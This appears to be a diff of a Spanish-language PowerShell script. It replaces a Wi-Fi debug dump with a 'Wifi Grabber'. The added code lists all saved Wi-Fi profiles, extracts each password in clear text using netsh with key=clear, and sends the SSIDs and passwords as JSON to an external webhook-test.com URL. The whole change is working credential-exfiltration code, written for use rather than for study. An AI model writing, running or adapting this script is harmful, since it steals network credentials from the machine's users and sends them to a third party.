@@ -1,20 +1,35 @@
-# Ruta del fichero de debug en el Escritorio
-$desktop    = [Environment]::GetFolderPath('Desktop')
-$debugFile  = Join-Path $desktop 'wifi_debug.txt'
+<#
+  Wifi Grabber – Webhook para Windows en Español (captura “Perfil de todos los usuarios”)
+#>
 
-# 1) Volcar salida completa de netsh wlan show profiles
-"netsh wlan show profiles → salida cruda" | Out-File $debugFile -Encoding utf8
-netsh wlan show profiles 2>&1 | Out-File $debugFile -Append -Encoding utf8
+# URL de tu webhook
+$webhook = 'https://webhook-test.com/dac752f76cec8c9fa7e9cff1baac3d64'
 
-# 2) Volcar sólo las líneas que coincidan con el filtro singular y plural
-""                               | Out-File $debugFile -Append -Encoding utf8
-"Filtrado regex 'Perfil de usuario':" | Out-File $debugFile -Append -Encoding utf8
-netsh wlan show profiles | Select-String 'Perfil de usuario' | Out-File $debugFile -Append -Encoding utf8
+# 1) Listar y parsear perfiles
+$perfiles = netsh wlan show profiles `
+  | Select-String 'Perfil de todos los usuarios\s*:\s*(.+)$' `
+  | ForEach-Object {
+      $ssid = $_.Matches[0].Groups[1].Value.Trim()
+      # 2) Obtener la contraseña en claro
+      $det = netsh wlan show profile name="$ssid" key=clear
+      $line = $det | Select-String 'Contenido de la clave\s*:\s*(.+)$'
+      $pass = if ($line) { $line.Matches[0].Groups[1].Value.Trim() } else { '' }
+      [PSCustomObject]@{ Profile = $ssid; Password = $pass }
+  }
 
-""                               | Out-File $debugFile -Append -Encoding utf8
-"Filtrado regex 'Perfiles de usuario':" | Out-File $debugFile -Append -Encoding utf8
-netsh wlan show profiles | Select-String 'Perfiles de usuario' | Out-File $debugFile -Append -Encoding utf8
+# 3) Pasar a JSON
+$json = $perfiles | ConvertTo-Json
 
-# 3) Aviso en pantalla
-Write-Host "`n=== Debug volcado en:`n  $debugFile`nPresiona ENTER para cerrar..."
-Read-Host
+# (DEBUG) Muestra el JSON en pantalla
+Write-Host "JSON a enviar:`n$json`n"
+
+# 4) Enviar al webhook
+try {
+    Invoke-RestMethod -Uri $webhook -Method Post -ContentType 'application/json' -Body $json
+    Write-Host "✅ Enviado correctamente."
+} catch {
+    Write-Error "❌ Error al enviar: $_"
+}
+
+# 5) Pausa para que veas resultados
+Read-Host -Prompt 'Presiona ENTER para cerrar'
